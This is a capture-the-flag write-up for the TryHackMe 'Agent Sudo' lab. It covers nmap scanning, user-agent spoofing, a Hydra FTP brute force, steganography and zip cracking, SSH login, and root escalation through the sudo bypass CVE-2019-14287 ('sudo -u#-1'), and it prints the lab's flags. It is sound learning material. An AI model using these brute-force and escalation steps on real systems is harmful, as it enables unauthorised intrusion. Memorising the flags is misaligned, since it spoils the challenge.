---
layout: default
title: Agent Sudo
parent: Easy
nav_order: 7
---

# Agent Sudo
## Task 2
### How many open ports?
`nmap -p- 10.66.181.9`
```diff
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 20:23 -0600
Nmap scan report for 10.66.181.9
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
```
### How you redirect yourself to a secret page?
`user-agent`
### What is the agent name?
`curl http://10.65.190.193`
```diff
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```
`curl -A "R" http://10.65.190.193`
```diff
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```
`curl -L -A "C" http://10.65.190.193`
```diff
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```
## Task 3
### FTP password
`hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.65.190.193`
```diff
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-03 19:23:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.65.190.193:21/
+[21][ftp] host: 10.65.190.193   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-03 19:24:09
```
### Zip file password
`ftp ftp://chris:crystal@10.65.190.193`

To download all file from the current dir

`mget *`

`To_agentJ.txt`
```diff
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
Checking the two files, `cute-alien.jpg` & `cutie.png`

`exiftool cute-alien.jpg`
```diff
ExifTool Version Number         : 13.44
File Name                       : cute-alien.jpg
Directory                       : .
File Size                       : 33 kB
File Modification Date/Time     : 2019:10:29 07:22:37-05:00
File Access Date/Time           : 2026:01:03 19:31:18-06:00
File Inode Change Date/Time     : 2026:01:03 19:30:44-06:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 440
Image Height                    : 501
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 440x501
Megapixels                      : 0.220
```

`exiftool cutie.png`
```diff
ExifTool Version Number         : 13.44
File Name                       : cutie.png
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2019:10:29 07:33:51-05:00
File Access Date/Time           : 2026:01:03 19:31:16-06:00
File Inode Change Date/Time     : 2026:01:03 19:30:44-06:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
+Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279
```
[View `xxd cutie.png` Output](7-Agent-Sudo-files/xxd-cutie-output.txt)
- Found, `To_agentR.txt` string/text

[View `strings cutie.png` Output](7-Agent-Sudo-files/strings-cutie-output.txt)
- Found, `To_agentR.txt` string/text

Search for embedded files
`binwalk cutie.png`
```diff
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
`binwalk -e cutie.png`
```diff
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

Convert the zip to a hash

`zip2john 8702.zip > hash.txt`
```diff
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

Find the password

`john hash.txt`
```diff
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
+alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2026-01-03 19:53) 1.265g/s 67886p/s 67886c/s 67886C/s 123456..faithfaith
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
### steg password
`7z e 8702.zip -palien`
```diff
7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:524288, ASM

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

Everything is Ok

Size:       86
Compressed: 280
```
`To_agentR.txt`
```diff
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
Decode the string, `QXJlYTUx`

`hURL -b "QXJlYTUx"`
```diff
Original string       :: QXJlYTUx
+base64 DEcoded string :: Area51
```
### Who is the other agent (in full name)?
`steghide extract -sf cute-alien.jpg -p Area51`
```diff
wrote extracted data to "message.txt".
```
```diff
+Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
### SSH password
`sshpass -p "hackerrules!" ssh james@10.65.190.193`
## Task 4
### What is the user flag?
`b03d975e8c92a7c04146cfa7a5a313c7`
### What is the incident of the photo called?
Download the file to the current dir, ...

`sshpass -p "hackerrules!" scp james@10.65.190.193:Alien_autospy.jpg .`

Do a google image search with the file `Alien_autospy.jpg`, [Google image Search](https://images.google.com/)
[Found](https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment?fbclid=IwAR3lx4LpA9lPosJQVVLLmXLJvCuhy8JCL79ck-b7I6boOWFoLeZvg3n3eHA)
`Roswell alien autopsy`
## Task 5
### CVE number for the escalation 
Login as james
`sshpass -p "hackerrules!" ssh james@10.65.190.193`

Check user permmisions
`sudo -l`
```diff
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
Allowed to run `/bin/bash` as any user except the root user

[sudo 1.8.27 - Security Bypass](https://www.exploit-db.com/exploits/47502)

`CVE-2019-14287`
### What is the root flag?
`sudo -u#-1 /bin/bash` from [sudo 1.8.27 - Security Bypass](https://www.exploit-db.com/exploits/47502)

`root.txt`
```diff
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
+b53a02f55b57d4439e3341834d70c062

By,
+DesKel a.k.a Agent R
```
`b53a02f55b57d4439e3341834d70c062`
###
`DesKel`